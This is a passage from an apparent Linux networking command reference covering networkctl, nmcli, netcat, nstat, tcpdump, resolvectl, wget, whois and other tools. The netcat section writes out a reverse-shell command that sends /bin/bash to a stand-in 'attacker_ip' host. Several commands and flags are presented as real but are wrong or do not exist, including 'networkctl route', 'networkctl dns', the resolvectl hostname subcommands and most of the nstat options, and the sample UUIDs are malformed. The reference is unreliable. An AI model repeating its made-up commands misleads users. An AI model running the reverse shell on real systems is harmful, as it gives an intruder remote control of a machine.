To show all network units (e.g., configuration files for network interfaces) managed by `systemd`:

```
networkctl list
```

This shows the status of each interface and whether it's configured correctly.

### 6. **Bring a network interface up**

To **activate** or bring a network interface (e.g., `eth0`) up:

```
sudo networkctl up eth0
```

This command activates the interface and assigns it the network configuration specified in its `systemd` network file.

### 7. **Bring a network interface down**

To **deactivate** or bring a network interface (e.g., `eth0`) down:

```
sudo networkctl down eth0
```

This command disables the interface.

### 8. **Show the current network configuration**

To show the current network configuration for all interfaces managed by `systemd-networkd`:

```
networkctl status
```

### 9. **Restart a network interface**

To **restart** a network interface (e.g., `eth0`):

```
sudo networkctl restart eth0
```

This is useful if you need to reapply the configuration to the interface.

### 10. **Show systemd network devices**

To show a list of all network devices recognized by `systemd` (interfaces, bonds, bridges, etc.):

```
networkctl status
```

### 11. **Show the default route (gateway)**

To view the **default route** (gateway) for the system:

```
networkctl route
```

This shows the routing table, including the default gateway and network routes.

### 12. **Show the DNS configuration**

To display the **DNS configuration** being used by the system (as set by `systemd-resolved`):

```
networkctl dns
```

### 13. **Show network information in a machine-readable format**

To display network information in a **machine-readable format** (JSON):

```
networkctl status --json
```

This is useful for scripting or programmatically processing the output.

---

### Example Outputs:

1. **List all network interfaces:**

   ```
   $ networkctl
   IDX  LINK  TYPE  OPERATIONAL  SETUP
    1    lo    loop  routable     configured
    2    eth0  ether  routable     configured
    3    wlan0 wlan  deconfigured  configured
   ```

2. **Show detailed status of `eth0`:**

   ```
   $ networkctl status eth0
   ● eth0
        Link File: /etc/systemd/network/10-eth0.network
     Network File: /etc/systemd/network/10-eth0.network
             Type: ether
            State: routable
       Address: 192.168.1.100
    MTU Size: 1500
   ```

3. **Bring `eth0` up:**

   ```
   $ sudo networkctl up eth0
   ```

4. **Show the DNS settings:**

   ```
   $ networkctl dns
   DNS Servers: 192.168.1.1
   ```

5. **Restart `eth0` network interface:**

   ```
   $ sudo networkctl restart eth0
   ```

6. **Show the current network routes:**

   ```
   $ networkctl route
   Default Route: 192.168.1.1
   ```
</details>
<details>
<summary>nmcli</summary>

The `nmcli` command is the command-line interface for **NetworkManager**, a service that manages network connections on Linux-based systems. It provides a powerful way to manage and configure network connections, interfaces, and Wi-Fi settings, and it's commonly used in environments where `NetworkManager` is the default network management tool (e.g., on many desktop and server distributions).

### 1. **Show all available network connections**

To display a list of all available **network connections** (both active and inactive):

```
nmcli connection show
```

This will list all saved network connections, including Wi-Fi, Ethernet, and VPN connections.

### 2. **Show active network connections**

To show only **active network connections**:

```
nmcli connection show --active
```

This will display the currently active network interfaces and their status.

### 3. **Show network interfaces**

To display all **network interfaces** managed by NetworkManager (including wired, wireless, and virtual interfaces):

```
nmcli device
```

This will list devices like `eth0`, `wlan0`, etc., along with their statuses (e.g., `connected`, `disconnected`, `unmanaged`).

### 4. **Connect to a Wi-Fi network**

To connect to a **Wi-Fi network**:

```
nmcli device wifi connect <SSID> password <PASSWORD>
```

Example:

```
nmcli device wifi connect "MyWiFi" password "MyPassword"
```

This will connect to the specified Wi-Fi network. Replace `<SSID>` with the network name and `<PASSWORD>` with the network's password.

### 5. **Disconnect from a network**

To **disconnect** a device from its current network (e.g., Wi-Fi or Ethernet):

```
nmcli connection down <connection_name>
```

For example, to disconnect from a Wi-Fi network:

```
nmcli connection down "MyWiFi"
```

### 6. **Enable or disable a network interface**

To **enable** a network interface (e.g., `eth0` or `wlan0`):

```
nmcli device set eth0 managed yes
nmcli device connect eth0
```

To **disable** a network interface:

```
nmcli device disconnect eth0
```

### 7. **Show details of a specific connection**

To show detailed information about a **specific network connection**:

```
nmcli connection show <connection_name>
```

For example:

```
nmcli connection show "MyWiFi"
```

This will display detailed configuration, including IP settings, DNS, routes, etc.

### 8. **Create a new Ethernet connection**

To create a **new Ethernet connection** (static IP setup example):

```
nmcli connection add type ethernet con-name "MyEthernet" ifname eth0 ip4 192.168.1.100/24 gw4 192.168.1.1
```

This command creates a new Ethernet connection named `MyEthernet` on the `eth0` interface, with a static IP address of `192.168.1.100/24` and a gateway of `192.168.1.1`.

### 9. **Create a new Wi-Fi connection**

To create a **new Wi-Fi connection** (with WPA2 encryption):

```
nmcli connection add type wifi con-name "MyWiFi" ifname wlan0 ssid "MyWiFi" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "MyPassword"
```

This creates a new Wi-Fi connection called `MyWiFi` on the `wlan0` interface, using WPA2 encryption and the specified password.

### 10. **Set a static IP address for an Ethernet connection**

To set a **static IP address** for an Ethernet connection:

```
nmcli connection modify "MyEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8"
nmcli connection up "MyEthernet"
```

This command sets a static IP (`192.168.1.100/24`), gateway (`192.168.1.1`), and DNS (`8.8.8.8`) for the `MyEthernet` connection and then brings it up.

### 11. **Set DNS servers for a connection**

To set custom **DNS servers** for a connection:

```
nmcli connection modify "MyEthernet" ipv4.dns "8.8.8.8,8.8.4.4"
```

This modifies the `MyEthernet` connection to use Google’s DNS servers (`8.8.8.8` and `8.8.4.4`).

### 12. **Show detailed Wi-Fi information**

To show detailed **Wi-Fi information** (e.g., available Wi-Fi networks):

```
nmcli device wifi list
```

This will list all available Wi-Fi networks along with details like signal strength, security type, etc.

### 13. **Scan for Wi-Fi networks**

To **scan** for available Wi-Fi networks:

```
nmcli device wifi rescan
```

After scanning, you can list available networks using `nmcli device wifi list`.

### 14. **Set the Wi-Fi mode (Access Point or Client)**

To set the **Wi-Fi interface mode** to **access point** (for creating a hotspot):

```
nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
```

This will create a Wi-Fi hotspot on the `wlan0` interface, using the SSID `MyHotspotSSID` and the password `HotspotPassword`.

### 15. **Show VPN connections**

To list all active **VPN connections**:

```
nmcli connection show --active | grep vpn
```

This will display the active VPN connections, if any.

### 16. **Turn off NetworkManager (disable networking)**

To **disable NetworkManager** and bring down all interfaces:

```
sudo nmcli networking off
```

### 17. **Turn on NetworkManager (enable networking)**

To **enable NetworkManager** and bring up interfaces:

```
sudo nmcli networking on
```

### 18. **Delete a connection**

To **delete** a network connection (e.g., `MyWiFi`):

```
nmcli connection delete "MyWiFi"
```

This will remove the connection configuration from `NetworkManager`.

---

### Example Outputs:

1. **List all available network connections:**

   ```
   $ nmcli connection show
   NAME           UUID                                  TYPE      DEVICE
   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
   WiredEthernet  5678abcd-12ef-34gh-56ij-lmno98765432  ethernet  eth0
   ```

2. **Show active network connections:**

   ```
   $ nmcli connection show --active
   NAME           UUID                                  TYPE      DEVICE
   MyWiFi         1234abcd-56ef-78gh-90ij-klmn12345678  wifi      wlan0
   ```

3. **Show Wi-Fi networks:**

   ```
   $ nmcli device wifi list
   SSID              BSSID              MODE   CHAN  RATE        SIGNAL  BARS  SECURITY
   MyWiFi            00:11:22:33:44:55  Infra  6     54 Mbit/s   70      ▂▄▆_  WPA2
   MyNeighborWiFi    66:77:88:99:00:11  Infra  11    54 Mbit/s   40      ▂▄__  WPA
   ```

4. **Connect to a Wi-Fi network:**

   ```
   $ nmcli device wifi connect "MyWiFi" password "MyPassword"
   ```

5. **Set a static IP address:**

   ```
   $ nmcli connection modify "WiredEthernet" ipv4.addresses 192.168.1.100/24 ipv4.gateway 192.168.1.1 ipv4.dns "8.8.8.8,8.8.4.4"
   $ nmcli connection up "WiredEthernet"
   ```

6. **Create a new Wi-Fi hotspot:**

   ```
   $ nmcli device wifi hotspot ifname wlan0 con-name "MyHotspot" ssid "MyHotspotSSID" band a channel 6 password "HotspotPassword"
   ```
</details>
<details>
<summary>netcat</summary>

The `netcat` command (often abbreviated as `nc`) is a powerful and versatile network utility used for reading from and writing to network connections using TCP or UDP. It is widely used for testing network connections, transferring data, port scanning, and as a basic network troubleshooting tool.

### 1. **Basic Port Scanning**

To **scan a specific port** (e.g., `80`) on a remote server (e.g., `example.com`):

```
nc -zv example.com 80
```

* `-z`: Scan without sending any data (only check if the port is open).
* `-v`: Verbose mode, show more information.

To scan a **range of ports** (e.g., ports 80 to 90):

```
nc -zv example.com 80-90
```

### 2. **Check if a Port is Open**

To check if a **specific port** (e.g., `22` for SSH) is open on a remote host:

```
nc -zv example.com 22
```

This will tell you whether port 22 is open or closed on `example.com`.

### 3. **Listen on a Specific Port**

To **listen** on a local port (e.g., port `12345`) and display any incoming data:

```
nc -l 12345
```

This command starts `nc` in listening mode on port `12345`. Any data sent to that port will be displayed in the terminal.

### 4. **Listen for Connections on a Specific Port (with Verbose Output)**

To listen on a port with more detailed output (i.e., show when connections are established):

```
nc -lv 12345
```

* `-l`: Listen mode.
* `-v`: Verbose output.

### 5. **Transfer a File Using Netcat (TCP)**

To **send a file** (`file.txt`) from one machine to another using netcat, you would need to execute two commands on different machines:

#### On the receiving machine (listening for a connection):

```
nc -l 12345 > received_file.txt
```

#### On the sending machine (transferring the file):

```
nc example.com 12345 < file.txt
```

This will send the contents of `file.txt` to the receiving machine, which writes it to `received_file.txt`.

### 6. **Create a Simple Chat Server**

To create a simple **chat server** that listens on port `12345`:

```
nc -l 12345
```

Then, on the client machine, connect to the server:

```
nc server_address 12345
```

Now, both machines can send messages back and forth.

### 7. **Connecting to a Remote Service**

To **connect** to a remote service (e.g., HTTP on port `80`) and send a simple HTTP GET request:

```
nc example.com 80
```

Then type the following:

```
GET / HTTP/1.1
Host: example.com

```

This sends a raw HTTP request, and the server will respond with the HTTP headers and the page content.

### 8. **Reverse Shell (Remote Access)**

To create a simple **reverse shell**, where the target machine connects back to the attacker's machine (use with caution and only in legal contexts):

#### On the attacker's machine (listening for a connection):

```
nc -lvp 12345
```

* `-l`: Listen mode.
* `-v`: Verbose output.
* `-p`: Specify the port.

#### On the target machine (connecting to the attacker’s machine):

```
nc attacker_ip 12345 -e /bin/bash
```

This command connects to the attacker's machine and opens a shell, allowing the attacker to run commands remotely. (Note: This is often used maliciously, so ensure it's only used for ethical testing.)

### 9. **UDP Communication (Sending Data)**

To **send UDP** data to a specific port (e.g., `12345`) on a remote host:

```
echo "Hello, world!" | nc -u example.com 12345
```

* `-u`: Use UDP instead of TCP.

### 10. **UDP Server Listening**

To listen for incoming UDP packets on port `12345`:

```
nc -lu 12345
```

This will display any UDP data sent to port `12345`.

### 11. **Pipe Output to Netcat**

To pipe the output of a command (e.g., `ls` or `df`) to netcat:

```
ls | nc -l 12345
```

This sends the output of the `ls` command (a list of files in the current directory) to anyone who connects to port `12345`.

### 12. **Test a Web Server**

To manually send an HTTP request and retrieve a response:

```
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
```

This simulates an HTTP GET request to `example.com` and displays the HTTP response.

### 13. **Banner Grabbing**

To perform a **banner grab** (retrieve information about a service running on a port, e.g., SSH):

```
nc -v example.com 22
```

This connects to port `22` (SSH) and may display the version of the SSH server in the banner.

### 14. **Send a Custom HTTP Request**

You can send custom HTTP requests to interact with web servers, for example:

```
echo -e "POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 18\r\n\r\nusername=admin&pass=1234" | nc example.com 80
```

This sends a raw HTTP POST request to the web server on `example.com`, which can be useful for testing web applications.

---

### Example Outputs:

1. **Listening for a connection (Receiving Data)**:

   ```
   $ nc -l 12345
   Hello from client!
   ```

2. **Port Scanning Output (Port 80 is open)**:

   ```
   $ nc -zv example.com 80
   example.com [192.168.1.100] 80 open
   ```

3. **Send a File via Netcat**:
   On the receiving machine:

   ```
   $ nc -l 12345 > received_file.txt
   ```

   On the sending machine:

   ```
   $ nc example.com 12345 < file.txt
   ```

4. **Simple HTTP Request (GET Request)**:

   ```
   $ echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
   HTTP/1.1 200 OK
   Server: Apache
   Content-Type: text/html; charset=UTF-8
   Content-Length: 1256
   Date: Mon, 01 Jan 2025 00:00:00 GMT
   ```

5. **UDP Communication**:

   ```
   $ echo "Test message" | nc -u example.com 12345
   ```
</details>
<details>
<summary>nstat</summary>

The `nstat` command is used to display network statistics in Linux systems. It provides various statistics about the network, including information about TCP, UDP, and other network protocols. This command can be helpful in network troubleshooting, performance monitoring, and general network analysis.

### 1. **Display all network statistics**

To display **all available network statistics**:

```
nstat
```

This will show a broad range of network statistics, including information on both TCP and UDP connections, as well as network interface statistics.

### 2. **Display TCP statistics**

To display **TCP-related statistics**:

```
nstat -t
```

This will provide detailed information about TCP connections, including statistics like the number of established connections, retransmissions, and more.

### 3. **Display UDP statistics**

To display **UDP-related statistics**:

```
nstat -u
```

This will display statistics specific to UDP, such as the number of received UDP packets, sent packets, and errors.

### 4. **Display network statistics for a specific protocol**

You can specify a protocol to view its statistics, such as:

* **TCP**:

  ```
  nstat -t
  ```
* **UDP**:

  ```
  nstat -u
  ```
* **ICMP** (Internet Control Message Protocol):

  ```
  nstat -i
  ```

### 5. **Display statistics for a specific connection**

To display **network statistics** for a specific connection, such as `tcp`, `udp`, or `ip`:

```
nstat -s
```

This will provide a summary of all statistics categorized by connection types (e.g., TCP, UDP).

### 6. **Display statistics for a specific network interface**

To display statistics for a specific network **interface** (e.g., `eth0`):

```
nstat -i eth0
```

This command will display the network statistics specific to the `eth0` interface, including packet counts, byte counts, errors, and more.

### 7. **Display summary statistics**

To get a **summary of all protocols**:

```
nstat -s
```

This will display the most important statistics of different network protocols in a summarized format.

### 8. **Display the statistics in human-readable form**

To display network statistics in a more **human-readable format**, you can use the `-h` flag:

```
nstat -h
```

This will attempt to display the statistics with more user-friendly units (e.g., converting bytes to kilobytes or megabytes).

### 9. **Display extended information for UDP statistics**

To display more **detailed UDP statistics**:

```
nstat -u -e
```

The `-e` flag provides extended statistics related to UDP packets, including information like receive errors, dropped packets, etc.

### 10. **Display detailed TCP statistics**

To display **detailed TCP statistics**:

```
nstat -t -e
```

This will give you detailed stats on TCP, such as retransmission counts, connection attempts, and more.

---

### Example Outputs:

1. **All network statistics**:

   ```
   $ nstat
   TcpExtTCPInSegs         12345678
   TcpExtTCPOutSegs        8765432
   UdpInDatagrams          23456
   UdpOutDatagrams         12345
   IcmpInMsgs              34567
   IcmpOutMsgs             23456
   ```

2. **Display TCP statistics**:

   ```
   $ nstat -t
   TcpExtTCPInSegs         12345678
   TcpExtTCPOutSegs        8765432
   TcpExtTCPRetransSegs    54321
   TcpExtTCPLostRetransSegs 1234
   ```

3. **Display UDP statistics**:

   ```
   $ nstat -u
   UdpInDatagrams          23456
   UdpOutDatagrams         12345
   ```

4. **Display statistics for a specific interface (`eth0`)**:

   ```
   $ nstat -i eth0
   eth0:  2345678 packets received, 4567890 packets sent
   eth0:  errors: 123
   ```

5. **Display statistics summary**:

   ```
   $ nstat -s
   TcpInSegs          12345678
   TcpOutSegs         8765432
   UdpInDatagrams     23456
   UdpOutDatagrams    12345
   IcmpInMsgs         34567
   IcmpOutMsgs        23456
   ```

6. **Display statistics in human-readable form**:

   ```
   $ nstat -h
   TcpInSegs          12.3M
   TcpOutSegs         8.7M
   UdpInDatagrams     23K
   UdpOutDatagrams    12K
   ```
</details>
<details>
<summary>ping</summary>

### 1. Basic ping to a host

```bash
ping google.com
```

---

### 2. Ping a specific IP address

```bash
ping 8.8.8.8
```

---

### 3. Send a fixed number of packets

```bash
ping -c 4 google.com
```

---

### 4. Set time interval between packets

```bash
ping -i 2 google.com
```

---

### 5. Set packet size

```bash
ping -s 1000 google.com
```

---

### 6. Flood ping (root only, for testing)

```bash
sudo ping -f 8.8.8.8
```

---

### 7. Quiet output (summary only)

```bash
ping -q google.com
```

---

### 8. Set timeout for ping

```bash
ping -w 5 google.com
```

---

### 9. Set TTL (Time To Live)

```bash
ping -t 64 google.com
```

---

### 10. Ping IPv4 only

```bash
ping -4 google.com
```

---

### 11. Ping IPv6 only

```bash
ping -6 google.com
```

---

### 12. Audible ping

```bash
ping -a google.com
```

---

### 13. Record route (may be blocked)

```bash
ping -R google.com
```

---

### 14. Ping local gateway

```bash
ping 192.168.1.1
```

---

### 15. Stop ping command

```text
Press Ctrl + C
```

---

### Common ping output fields

```text
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=18.3 ms
```

* icmp_seq: Packet sequence number
* ttl: Time to Live
* time: Round-trip time
</details>
<details>
<summary>rsync</summary>

`rsync` synchronizes files and directories between two locations by copying only the differences, making transfers fast and efficient (locally or over a network).

### 1. Basic file copy

```bash
rsync file1.txt file2.txt
```

---

### 2. Copy a file to a directory

```bash
rsync file1.txt /backup/
```

---

### 3. Copy a directory recursively

```bash
rsync -r source_dir/ dest_dir/
```

---

### 4. Archive mode (recommended)

Preserves permissions, ownership, timestamps, and copies recursively.

```bash
rsync -a source_dir/ dest_dir/
```

---

### 5. Show progress while copying

```bash
rsync -av --progress source_dir/ dest_dir/
```

---

### 6. Copy and compress over network

```bash
rsync -avz source_dir/ user@remote:/backup/
```

---

### 7. Copy from remote system

```bash
rsync -av user@remote:/data/ /local_backup/
```

---

### 8. Delete files in destination not in source

```bash
rsync -av --delete source_dir/ dest_dir/
```

---

### 9. Exclude files or directories

```bash
rsync -av --exclude='*.log' source_dir/ dest_dir/
```

---

### 10. Dry run (no actual changes)

```bash
rsync -av --dry-run source_dir/ dest_dir/
```

---

### 11. Preserve hard links

```bash
rsync -aH source_dir/ dest_dir/
```

---

### 12. Limit bandwidth usage

```bash
rsync -av --bwlimit=500 source_dir/ dest_dir/
```

---

### 13. Copy using SSH on a custom port

```bash
rsync -av -e "ssh -p 2222" source_dir/ user@remote:/backup/
```

---

### 14. Mirror two directories

```bash
rsync -av --delete /data/ /mirror/
```

---

### Commonly used options (short)

```text
-a  archive mode
-v  verbose
-z  compress
-r  recursive
--delete  remove extra files
--progress  show progress
--dry-run  test only
```

---

### Important tip

Trailing slashes matter:

```bash
rsync -a dir1/ dir2/   # copy contents
rsync -a dir1  dir2/   # copy directory
```
</details>
<details>
<summary>scp</summary>

`scp` securely copies files or directories between a local and a remote host (or between two remote hosts) over SSH.

### 1. Copy a local file to a remote server

```bash
scp file.txt user@remote:/home/user/
```

---

### 2. Copy a remote file to local system

```bash
scp user@remote:/home/user/file.txt /local/directory/
```

---

### 3. Copy a directory recursively

```bash
scp -r /local/dir user@remote:/home/user/
```

---

### 4. Copy using a custom SSH port

```bash
scp -P 2222 file.txt user@remote:/home/user/
```

---

### 5. Copy multiple files at once

```bash
scp file1.txt file2.txt user@remote:/home/user/
```

---

### 6. Copy from remote to remote (through local machine)

```bash
scp user1@host1:/path/file.txt user2@host2:/path/
```

---

### 7. Limit bandwidth usage

```bash
scp -l 500 file.txt user@remote:/home/user/
```

---

### 8. Enable verbose output

```bash
scp -v file.txt user@remote:/home/user/
```

---

### 9. Preserve file attributes (timestamps, permissions)

```bash
scp -p file.txt user@remote:/home/user/
```

---

### 10. Using identity (private key) for authentication

```bash
scp -i ~/.ssh/id_rsa file.txt user@remote:/home/user/
```

---

### Common options

```text
-r   recursive (for directories)
-P   specify port
-p   preserve file attributes
-l   limit bandwidth
-v   verbose mode
-i   specify SSH key
```
</details>
<details>
<summary>tcpdump</summary>

`tcpdump` captures and analyzes network packets transmitted or received on a network interface, allowing you to inspect traffic in real time or save it for later analysis.

### 1. Capture packets on the default interface

```bash
sudo tcpdump
```

---

### 2. Capture packets on a specific interface

```bash
sudo tcpdump -i eth0
```

---

### 3. Capture a specific number of packets

```bash
sudo tcpdump -c 10 -i eth0
```

---

### 4. Capture packets and display in verbose mode

```bash
sudo tcpdump -v -i eth0
```

---

### 5. Capture only TCP packets

```bash
sudo tcpdump tcp -i eth0
```

---

### 6. Capture only UDP packets

```bash
sudo tcpdump udp -i eth0
```

---

### 7. Capture only ICMP (ping) packets

```bash
sudo tcpdump icmp -i eth0
```

---

### 8. Capture packets from a specific host

```bash
sudo tcpdump host 192.168.1.10 -i eth0
```

---

### 9. Capture packets from a specific source

```bash
sudo tcpdump src 192.168.1.10 -i eth0
```

---

### 10. Capture packets to a specific destination

```bash
sudo tcpdump dst 8.8.8.8 -i eth0
```

---

### 11. Capture packets on a specific port

```bash
sudo tcpdump port 80 -i eth0
```

---

### 12. Write captured packets to a file

```bash
sudo tcpdump -i eth0 -w capture.pcap
```

---

### 13. Read packets from a file

```bash
sudo tcpdump -r capture.pcap
```

---

### 14. Display packets in readable ASCII

```bash
sudo tcpdump -A -i eth0
```

---

### 15. Display packets in hex and ASCII

```bash
sudo tcpdump -X -i eth0
```

---

### Common options (short)

```text
-i   interface
-c   number of packets
-w   write to file
-r   read from file
-v   verbose
-A   ASCII
-X   hex + ASCII
```
</details>
<details>
<summary>telnet</summary>

`telnet` connects to a remote host over TCP to test or interact with network services, typically for troubleshooting or management.

### 1. Connect to a remote host (default port 23)

```bash
telnet example.com
```

---

### 2. Connect to a remote host on a specific port

```bash
telnet example.com 80
```

---

### 3. Connect to a local host

```bash
telnet localhost 23
```

---

### 4. Test if SSH port is open

```bash
telnet 192.168.1.10 22
```

---

### 5. Test if HTTP port is open

```bash
telnet 192.168.1.10 80
```

---

### 6. Connect to SMTP server (mail)

```bash
telnet mail.example.com 25
```

---

### 7. Connect to POP3 mail server

```bash
telnet mail.example.com 110
```

---

### 8. Connect to IMAP mail server

```bash
telnet mail.example.com 143
```

---

### 9. Connect to MySQL server port

```bash
telnet 192.168.1.10 3306
```

---

### 10. Connect to PostgreSQL server port

```bash
telnet 192.168.1.10 5432
```

---

### 11. Connect to Redis server

```bash
telnet 192.168.1.10 6379
```

---

### 12. Connect to FTP server port

```bash
telnet 192.168.1.10 21
```

---

### 13. Test connection to custom application port

```bash
telnet 192.168.1.10 8080
```

---

### 14. Check if a firewall blocks a port

```bash
telnet 8.8.8.8 53
```

---

### 15. Connect to HTTP and manually send a request

```bash
telnet example.com 80
```

Then type:

```
GET / HTTP/1.1
Host: example.com
```
</details>
<details>
<summary>traceroute</summary>

`traceroute` shows the path packets take from your machine to a destination host, listing all intermediate routers and measuring the time to each hop.

### 1. Basic traceroute to a host

```bash
traceroute example.com
```

---

### 2. Traceroute to an IP address

```bash
traceroute 8.8.8.8
```

---

### 3. Specify maximum number of hops

```bash
traceroute -m 20 example.com
```

---

### 4. Set wait time for each probe

```bash
traceroute -w 3 example.com
```

---

### 5. Change packet size

```bash
traceroute -q 3 -s 60 example.com
```

---

### 6. Limit number of queries per hop

```bash
traceroute -q 1 example.com
```

---

### 7. Use ICMP instead of UDP

```bash
traceroute -I example.com
```

---

### 8. Use TCP SYN packets

```bash
traceroute -T -p 80 example.com
```

---

### 9. Use IPv4 only

```bash
traceroute -4 example.com
```

---

### 10. Use IPv6 only

```bash
traceroute -6 example.com
```

---

### 11. Set source address

```bash
traceroute -s 192.168.1.10 example.com
```

---

### 12. Display numeric addresses only

```bash
traceroute -n example.com
```

---

### 13. Set port number for TCP/UDP probes

```bash
traceroute -p 443 example.com
```

---

### 14. Increase packet timeout per hop

```bash
traceroute -w 5 example.com
```

---

### 15. Verbose mode (show details)

```bash
traceroute -v example.com
```

---

### Common options (short)

```text
-m   max hops
-w   wait time
-q   number of queries per hop
-I   ICMP mode
-T   TCP SYN
-4   IPv4 only
-6   IPv6 only
-n   numeric output
-p   port number
-s   source address
```
</details>
<details>
<summary>resolvectl</summary>

`resolvectl` queries or configures DNS and name resolution on a systemd-based Linux system.

### 1. Show current DNS configuration

```bash
resolvectl status
```

---

### 2. Show DNS servers for a specific interface

```bash
resolvectl dns eth0
```

---

### 3. Set a DNS server for an interface

```bash
sudo resolvectl dns eth0 8.8.8.8
```

---

### 4. Set multiple DNS servers

```bash
sudo resolvectl dns eth0 8.8.8.8 8.8.4.4
```

---

### 5. Show default domain for an interface

```bash
resolvectl domain eth0
```

---

### 6. Set a search domain for an interface

```bash
sudo resolvectl domain eth0 example.com
```

---

### 7. Show DNSSEC status

```bash
resolvectl status
```

---

### 8. Flush DNS cache

```bash
sudo resolvectl flush-caches
```

---

### 9. Query a domain using systemd-resolved

```bash
resolvectl query example.com
```

---

### 10. Query a domain using a specific interface

```bash
resolvectl query example.com eth0
```

---

### 11. Show LLMNR (Link-Local Multicast Name Resolution) status

```bash
resolvectl llmnr
```

---

### 12. Enable LLMNR

```bash
sudo resolvectl llmnr eth0 yes
```

---

### 13. Disable LLMNR

```bash
sudo resolvectl llmnr eth0 no
```

---

### 14. Show current hostname

```bash
resolvectl hostname
```

---

### 15. Set the system hostname

```bash
sudo resolvectl set-hostname myhost
```

---

### Common options (short)

```text
dns      show/set DNS servers
domain   show/set search domains
flush-caches   clear DNS cache
query    query a domain
llmnr    manage LLMNR
hostname show/set system hostname
status   display overall resolver status
```
</details>
<details>
<summary>wget</summary>

`wget` is a command-line tool that **downloads files from the web** via HTTP, HTTPS, or FTP, supporting recursive downloads, resume, and background operation.

### 1. Download a single file

```bash
wget http://example.com/file.txt
```

---

### 2. Download a file and save with a different name

```bash
wget -O newname.txt http://example.com/file.txt
```

---

### 3. Download in the background

```bash
wget -b http://example.com/file.txt
```

---

### 4. Limit download speed

```bash
wget --limit-rate=100k http://example.com/file.txt
```

---

### 5. Download recursively from a website

```bash
wget -r http://example.com/
```

---

### 6. Download recursively with level limit

```bash
wget -r -l 2 http://example.com/
```

---

### 7. Download only specific file types

```bash
wget -r -A pdf http://example.com/
```

---

### 8. Resume a partially downloaded file

```bash
wget -c http://example.com/file.zip
```

---

### 9. Mirror a website

```bash
wget -m http://example.com/
```

---

### 10. Download using FTP

```bash
wget ftp://user:password@ftp.example.com/file.txt
```

---

### 11. Download multiple files listed in a text file

```bash
wget -i filelist.txt
```

---

### 12. Ignore robots.txt rules

```bash
wget -e robots=off -r http://example.com/
```

---

### 13. Set user-agent string

```bash
wget --user-agent="Mozilla/5.0" http://example.com/file.txt
```

---

### 14. Turn off certificate check (HTTPS)

```bash
wget --no-check-certificate https://example.com/file.txt
```

---

### 15. Quiet mode (no output)

```bash
wget -q http://example.com/file.txt
```

---

### Common options (short)

```text
-O      save as different name
-b      background download
-c      continue/resume download
-r      recursive download
-l      recursion depth
-A      accept only specific file types
-i      read URLs from file
-m      mirror website
-q      quiet mode
--limit-rate  limit download speed
--user-agent  set user-agent
--no-check-certificate  skip SSL check
```
</details>
<details>
<summary>yt-dlp</summary>

`yt-dlp` is a command-line tool to **download videos and audio from YouTube and many other websites**, with options for format selection, playlists, subtitles, and metadata.

### 1. Download a video from YouTube

```bash
yt-dlp https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 2. Download video in best quality

```bash
yt-dlp -f best https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 3. Download audio only

```bash
yt-dlp -x --audio-format mp3 https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 4. Download multiple videos from a file

```bash
yt-dlp -a urls.txt
```

---

### 5. Save with custom filename

```bash
yt-dlp -o '%(title)s.%(ext)s' https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 6. Download a playlist

```bash
yt-dlp -i https://www.youtube.com/playlist?list=PLAYLIST_ID
```

---

### 7. Resume interrupted download

```bash
yt-dlp -c https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 8. Limit download speed

```bash
yt-dlp --limit-rate 500K https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 9. Download subtitles only

```bash
yt-dlp --write-sub --skip-download https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 10. Embed subtitles into video

```bash
yt-dlp --embed-subs https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 11. Download videos older than a certain date

```bash
yt-dlp --datebefore 20220101 https://www.youtube.com/playlist?list=PLAYLIST_ID
```

---

### 12. Download videos newer than a certain date

```bash
yt-dlp --dateafter 20230101 https://www.youtube.com/playlist?list=PLAYLIST_ID
```

---

### 13. Extract metadata only

```bash
yt-dlp --print-json https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 14. Download from a restricted site with cookies

```bash
yt-dlp --cookies cookies.txt https://www.youtube.com/watch?v=VIDEO_ID
```

---

### 15. Combine video and audio manually

```bash
yt-dlp -f bestvideo+bestaudio https://www.youtube.com/watch?v=VIDEO_ID
```

---

### Common options (short)

```text
-f             select format
-x             extract audio
--audio-format specify audio format
-o             output template
-i             ignore errors
-c             resume download
--limit-rate   limit download speed
--write-sub    download subtitles
--embed-subs   embed subtitles
--datebefore   videos before date
--dateafter    videos after date
--cookies      use cookies
```
</details>
<details>
<summary>whois</summary>

`whois` queries the public **WHOIS database** to retrieve registration and ownership information about a domain name, IP address, or autonomous system.

### 1. Basic domain lookup

```bash
whois example.com
```

---

### 2. Lookup a domain with a specific WHOIS server

```bash
whois -h whois.verisign-grs.com example.com
```

---

### 3. Lookup an IP address

```bash
whois 8.8.8.8
```

---

### 4. Lookup multiple domains at once

```bash
whois example.com example.net example.org
```

---

### 5. Display only the registrar information

```bash
whois example.com | grep Registrar
```

---

### 6. Display domain creation date

```bash
whois example.com | grep 'Creation Date'
```

---

### 7. Display domain expiration date

```bash
whois example.com | grep 'Expiry Date'
```

---

### 8. Query using verbose mode

```bash
whois -v example.com
```

---

### 9. Lookup a country-specific TLD

```bash
whois example.co.uk
```

---

### 10. Lookup a `.org` domain

```bash
whois example.org
```

---

### 11. Lookup a `.net` domain

```bash
whois example.net
```

---

### 12. Save WHOIS output to a file

```bash
whois example.com > whois_output.txt
```

---

### 13. Search for a domain by keyword (using grep)

```bash
whois example.com | grep 'Name Server'
```

---

### 14. Lookup using port 43 (manual)

```bash
whois -h whois.verisign-grs.com -p 43 example.com
```

---

### 15. Display only lines containing "Domain"

```bash
whois example.com | grep -i domain
```

---

### Common options (short)

```text
-h    specify WHOIS server
-p    specify port
-v    verbose output
```
</details>
<details>
<summary>ipcalc</summary>

